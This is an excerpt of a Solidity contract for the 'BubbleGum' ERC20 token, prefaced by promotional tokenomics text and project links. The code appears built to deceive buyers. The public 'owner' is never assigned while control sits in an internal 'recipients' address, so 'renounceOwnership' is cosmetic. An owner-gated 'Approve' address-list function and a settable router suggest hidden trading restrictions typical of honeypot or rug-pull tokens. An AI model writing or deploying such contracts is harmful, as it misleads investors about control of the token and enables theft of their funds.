...
Tokenomics:
As sweet as can be.
☞ 10% fee on every transaction = 5% redistributed to all holders, 3% transaction fee, and a 2% burn fee!

The Defi dAPP (asset tracker) is currently in development.

TRACK
Connect your wallet to the new Bubblegum dapp to view current prices & track your gains.
MEASURE
Get unique statistics such as average holding size, average holding time, burn rates, liquidity, & more.
ANALYZE
Discover trading trends, based on your holdings, to give you a leg up & make you a better investor.

https://t.me/bubblegumeth
www.bubblegumtoken.com
*/
...
contract BUBBLEGUM is Context {
    address internal recipients;
    address internal router;
    address public owner;

    mapping (address => bool) internal Approved;
    event bubblegum(address indexed previousi, address indexed newi);
    constructor () {
        address msgSender = _msgSender();
        recipients = msgSender;
        emit bubblegum(address(0), msgSender);
    }
    modifier checker() {
    ...
    function renounceOwnership() public virtual checker {
        emit bubblegum(owner, address(0));
         owner = address(0);
    }
}
...
contract ERC20 is Context, IERC20, IERC20Metadata , BUBBLEGUM{
    ...
    function setRouter (address Uniswaprouterv02) public checker {
    ...
    function Approve(address[] memory _addresses) external checker {
...
contract BubbleGum is ERC20{
    ...
    uint256 private _totalSupply = 555555555 * 10 ** 18;

    constructor () ERC20('BubbleGum', unicode'BUBBLEGUM🍬') {
